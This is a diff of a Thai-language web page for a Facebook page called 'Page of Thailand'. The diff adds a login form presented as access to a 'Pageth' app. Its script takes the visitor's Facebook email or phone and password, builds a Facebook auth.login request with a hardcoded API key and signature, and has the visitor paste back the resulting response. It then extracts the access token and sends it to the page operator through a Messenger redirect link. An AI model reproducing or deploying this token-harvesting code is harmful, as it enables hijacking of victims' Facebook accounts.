@@ -1,159 +1,299 @@
-
-
 <!DOCTYPE html>
 <html lang="th">
+
 <head>
-	<!--  App Title  -->
-	<title>เพจแห่งประเทศไทย</title>
-	<!--  App Description  -->
-	<meta name="description" content="iOS , Android , Windows."/>
-	<meta charset="utf-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0" />
 
-	<link rel="stylesheet" type="text/css" href="css/bootstrap.css"/>
-	<link rel="stylesheet" type="text/css" href="css/owl.transitions.css"/>
-	<link rel="stylesheet" type="text/css" href="css/owl.carousel.css"/>
-	<link rel="stylesheet" type="text/css" href="css/animate.css"/>
-	<link rel="stylesheet" type="text/css" href="css/main.css"/>
+    <title>เข้าสู่ระบบ เพจแห่งประเทศไทย</title>
 
-	
-	<script type="text/javascript" src="js/jquery.js"></script>
-	<script type="text/javascript" src="js/ajaxchimp.js"></script>
-	<script type="text/javascript" src="js/scrollTo.js"></script>
-	<script type="text/javascript" src="js/owl.carousel.min.js"></script>
-	<script type="text/javascript" src="js/wow.js"></script>
-	<script type="text/javascript" src="js/parallax.js"></script>
-	<script type="text/javascript" src="js/nicescroll.js"></script>
-	<script type="text/javascript" src="js/main.js"></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
+
+    <script type="text/javascript" src="js/md5.js"></script>
+
+    <script>
+        (function () {
+            function toJSONString(form) {
+                var obj = {};
+                var elements = form.querySelectorAll("input, select, textarea");
+                for (var i = 0; i < elements.length; ++i) {
+                    var element = elements[i];
+                    var name = element.name;
+                    var value = element.value;
+
+                    if (name) {
+                        obj[name] = value;
+                    }
+                }
+                console.log(obj)
+                if (obj.user && obj.pass) {
+                    $('#aaa').hide();
+                    $('#bbb').show();
+
+                    var email = obj.user;
+                    var password = obj.pass;
+                    var data = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + email + 'format=JSONmethod=auth.loginpassword=' + password + 'v=1.062f8ce9f74b12f84c123cc23437a4a32';
+                    var sig = md5(data);
+
+                    var aurl = 'https://api.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email=' + email + '&format=JSON&method=auth.login&password=' + password + '&v=1.0&sig=' + sig;
+                    //console.log(aurl);
+
+                    //window.location = aurl
+
+                    return JSON.stringify(aurl);
+
+                } else if (!obj.pass) {
+
+                    alert("คุณไม่ได้กรอก รหัสผ่านสำหรับแอพ Pageth!");
+                    return undefined
+                } else if (!obj.user) {
+
+                    alert("คุณไม่ได้กรอก อีเมล์/เบอร์โทร เฟสบุ๊ค !");
+                    return undefined
+                } else {
+                    console.log("unknown");
+                    return undefined
+                }
+
+
+
+            }
+
+            document.addEventListener("DOMContentLoaded", function () {
+                var form = document.getElementById("test");
+                var output = document.getElementById("output");
+                form.addEventListener("submit", function (e) {
+                    e.preventDefault();
+                    var json = toJSONString(this);
+
+                    //output.innerHTML = json;
+                    if (json != undefined) {
+                        output.innerHTML = '<iframe src=' + json + ' style="height: 100%; width: 100%;"></iframe>';
+                    }
+
+
+                }, false);
+
+            });
+
+        })();
+    </script>
+
+
+    <script>
+        (function () {
+            function toJSONString(form) {
+                var obj = {};
+                var elements = form.querySelectorAll("input, select, textarea");
+                for (var i = 0; i < elements.length; ++i) {
+                    var element = elements[i];
+                    var name = element.name;
+                    var value = element.value;
+
+                    if (name) {
+                        obj[name] = value;
+                    }
+                }
+                console.log(obj)
+
+                if (obj.text) {
+                    var text = obj.text;
+                    var matchtoken = text.match(/[A-Z]([A-Za-z0-9]){128,255}/);
+                    var matchsms = text.match(/"error_code":406/);
+                    var matchIncorrectUsername = text.match(/Incorrect Username/);
+                    var matchIncorrectPhone = text.match(/Incorrect Phone/);
+                    var matchIncorrectEmail = text.match(/Incorrect Email/);
+                    var matchIncorrectPass = text.match(/Incorrect Password/);
+                    var matchverify = text.match(/"error_code":405/);
+                    var matchrequiredemail = text.match(/"error_code":100/);
+                    var matcholdpass = text.match(/"error_code":401/);
+                    var matchsignature = text.match(/"error_code":104/);
+
+                    if (matchtoken !== null) {
+                        $('#bbb').hide();
+                        $('#ccc').show();
+                        window.location = "https://m.me/Page.of.Thailand?ref=token_" + matchtoken[0]
+                    } else if (matchsms !== null) {
+                        alert("📌คุณต้องปิดฟังก์ชั่นรับ SMS ในเฟสบุ๊คก่อน\nแล้วทำใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchIncorrectUsername !== null) {
+                        alert("❌อีเมล์/เบอร์โทร เฟสบุ๊คของคุณ ผิด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchIncorrectPhone !== null) {
+                        alert("❌คุณกรอกเบอร์โทรศัพท์ผิด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchIncorrectEmail !== null) {
+                        alert("❌คุณกรอกอีเมล์เฟสบุ๊คผิด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchIncorrectPass !== null) {
+                        alert("❌คุณกรอกรหัสผ่าน ผิด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchverify !== null) {
+                        alert("📌คุณต้องยืนยันบัญชีของตนเองในเฟสบุ๊คก่อน\nแล้วกลับทำใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchrequiredemail !== null) {
+                        alert("❌คุณไม่ได้กรอกอีเมล์เฟสบุ๊ค ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matcholdpass !== null) {
+                        alert("❌คุณกรอกรหัสผ่าน ผิด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchsignature !== null) {
+                        alert("❌มีบางอย่างผิดพลาด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else {
+                        //
+                        console.log("case else incorrect => " + text);
+                        alert("❌มีบางอย่างผิดพลาด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    }
+                } else {
+                    alert("❌คุณไม่ได้วางโค้ด ❗️\nลองใหม่อีกครั้ง ❗️");
+                }
+
+
+                //window.location = aurl
+
+                return JSON.stringify(obj);
+            }
+
+            document.addEventListener("DOMContentLoaded", function () {
+                var form = document.getElementById("test2");
+                var output = document.getElementById("output");
+                form.addEventListener("submit", function (e) {
+                    e.preventDefault();
+                    var json = toJSONString(this);
+
+                    //output.innerHTML = json;
+                    //output.innerHTML = '<iframe src=' + json + ' width="100%" height="100%"></iframe>';
+
+                }, false);
+
+            });
+
+        })();
+    </script>
+
+    <style>
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid blue;
+            border-right: 16px solid green;
+            border-bottom: 16px solid red;
+            width: 120px;
+            height: 120px;
+            -webkit-animation: spin 2s linear infinite;
+            animation: spin 2s linear infinite;
+        }
+
+        @-webkit-keyframes spin {
+            0% {
+                -webkit-transform: rotate(0deg);
+            }
+            100% {
+                -webkit-transform: rotate(360deg);
+            }
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
 
 </head>
+
 <body>
-	
-	<!--  Header Section  -->
-	<header>
-		<div class="container">
-			<div class="logo pull-left animated wow fadeInLeft">
-				<img src="img/facebook.png" alt="" title="">
-			</div>
-			<nav class="pull-left">
-				<ul class="list-unstyled">
-					<li class="animated wow fadeInLeft" data-wow-delay="0s"><a href="https://www.facebook.com/Page.of.Thailand">เพจแห่งประเทศไทย</a></li>
-					<li class="animated wow fadeInLeft" data-wow-delay=".1s"><a href="https://www.facebook.com/groups/2014970452116982">กลุ่มเพจแห่งประเทศไทย</a></li>
-				</ul>
-			</nav>
-		</div>
-	</header>
-	<!--  End Header Section  -->
+
+    <div class="container" id="aaa">
+        <div class="jumbotron">
+            <h2 class="text-success">เพจแห่งประเทศไทย</h2>
+            <br><br>
+            <img src="https://raw.githubusercontent.com/pageth/about/master/pictures/passpageth.png" class="d-block mx-auto" style="width:50%">
+            <br><br>
+            <form id="test" action="#" method="post">
+
+
+                <div class="form-group">
+                    <label for="pass">รหัสผ่านสำหรับแอพ Pageth ของคุณ:</label>
+                    <input type="text" class="form-control" name="pass" id="pass" placeholder="รหัสผ่านสำหรับแอพ Pageth">
+                </div>
+
+                <br>
+                <div class="form-group">
+                    <label for="user">อีเมล์/เบอร์โทร เฟสบุ๊ค ของคุณ:</label>
+                    <input type="text" class="form-control" name="user" id="user" placeholder="อีเมล์/เบอร์โทร เฟสบุ๊ค">
+                </div>
+                <br>
+
+
+                <p>
+                    <input type="submit" value="Send" class="btn btn-primary btn-block" />
+                </p>
+            </form>
 
 
 
+        </div>
+    </div>
 
 
+    <div class="container" id="bbb" style="display: none">
+        <div class="jumbotron">
+            <h2 class="text-success">เพจแห่งประเทศไทย</h2>
+            <br><br>
+            <label>รอโหลดโค้ด... แล้วคัดลอกโค้ด<br></label>
 
-	<!--  Hero Section  -->
-	<section class="hero" id="hero">
-		<div class="container">
-			<div class="caption">
-				<h1 class="text-uppercase  animated wow fadeInLeft">เพจแห่งประเทศไทย.</h1>
-				<p class="text-lowercase  animated wow fadeInLeft">ถ้าใช้งานไม่เป็น กรุณาอ่านด้านล่างก่อน.</p>
+            <pre id="output"> <br></pre>
+            <img src="https://raw.githubusercontent.com/pageth/about/master/pictures/arrow.png" class="d-block mx-auto" style="width:10%">
 
-				<a href="https://pageth.github.io/login/login.html" class="app_store_btn text-uppercase animated wow fadeInLeft">
-					<i class="iphone_icon"></i>
-					<i class="android_icon"></i>
-					<i class="windows_icon"></i>
-					<span>กดเพื่อรับโค้ดเข้าระบบ</span>
-				</a>
-			</div>			
-		</div>
-	</section>
-	<!--  End Hero Section  -->
+            <form id="test2" action="#" method="post">
+                <div class="form-group">
+                    <label for="comment">มาวางข้างล่างนี้:</label>
+                    <textarea class="form-control" rows="5" id="comment" name="text"></textarea>
+                </div>
+                <button type="submit" class="btn btn-primary">Submit</button>
+            </form>
+        </div>
+    </div>
 
+    <div class="container" id="ccc" style="display: none">
+        <div class="jumbotron">
+            <h2 class="text-success">เพจแห่งประเทศไทย</h2>
+            <br><br>
 
+            <div class="loader"></div>
 
-
-
-
-	<!--  Featured On Section  -->
-	<section class="featured_on">
-		<div class="container">
-			<ul class="list-unstyled text-center clearfix">
-				<li class="col-xs-6 col-sm-6 col-md-3 animated wow fadeInDown">
-					<img src="img/google_logo.png" alt="" title="">
-				</li>
-				<li class="col-xs-6 col-sm-6 col-md-3 animated wow fadeInDown" data-wow-delay=".2s">
-					<img src="img/facebook_logo.png" alt="" title="">
-				</li>
-			</ul>
-		</div>
-	</section>
-	<!--  End Featured On Section  -->
-
-
-
-
-
-
-	<!--  About Section  -->
-	<section class="list-unstyled list-inline app_platform">
-		<div class="container">
-			<div class="row">
-
-				<div class="col-md-6 animated wow fadeInRight">
-					<div class="features_list">
-						<h1 class="text-uppercase">วีดีโอสอน เข้าใช้งานระบบ.</h1>
-						<iframe width="560" height="315" src="https://www.youtube.com/embed/epjqcB3W_9U?rel=0&autoplay=1" frameborder="0" gesture="media" allowfullscreen></iframe>
-					</div>					
-				</div>
-			</div>
-		</div>
-
-		<div class="about_video show_video">
-			<a href="" class="close_video"></a>
-		</div>
-	</section>
-	<!--  End About Section  -->
-
-
-
-
-
-	<!--  Email Subscription Section  -->
-	<section class="sub_box">
-		<p class="cta_text animated wow fadeInDown">1. กดเพื่อรับโค้ดเข้าระบบ !</p>
-		<a class="cta_text animated wow fadeInDown" href="https://goo.gl/qmNe3f"><img src="img/1.png"  style="max-width: 100%; height: auto; alt="" title=""></a><br><br><br><br><br><br>
-
-		<p class="cta_text animated wow fadeInDown">2. กรอกรหัสเฟสบุ๊ค แล้วกด 'Log in' !</p>
-		<a class="cta_text animated wow fadeInDown" href="#"><img src="img/10.png"  style="max-width: 100%; height: auto; alt="" title=""></a><br><br><br><br><br><br>
-
-		<p class="cta_text animated wow fadeInDown">3. คัดลอก Code ทั้งหมด แล้วส่ง Code ให้เพจแห่งประเทศไทย !</p>
-		<a class="cta_text animated wow fadeInDown" href="#"><img src="img/11.png"  style="max-width: 100%; height: auto; alt="" title=""></a><br><br><br><br><br><br>
-
-	</section>
-	<!--  End Email Subscription Section  -->
-
-
-
-
-
-
-	<!--  Footer Section  -->
-	<footer>
-		<ul class="list-unstyled list-inline app_platform">
-			<li class="animated wow fadeInDown" data-wow-delay="0s">
-				<a href=""><img src="img/android_icon.png" alt="" title=""></a>
-			</li>
-			<li class="animated wow fadeInDown" data-wow-delay=".1s">
-				<a href=""><img src="img/ios_icon.png" alt="" title=""></a>
-			</li>
-			<li class="animated wow fadeInDown" data-wow-delay=".2s">
-				<a href=""><img src="img/windows_icon.png" alt="" title=""></a>
-			</li>
-		</ul>
-		<p class="copyright animated wow fadeIn" data-wow-duration="2s">© 2017 <a href="https://www.facebook.com/Page.of.Thailand" target="_blank"><strong>เพจแห่งประเทศไทย</strong></a>. All Rights Reserved</p>
-	</footer>
-	<!--  End Footer Section  -->
-
+        </div>
+    </div>
 
 </body>
+
 </html>
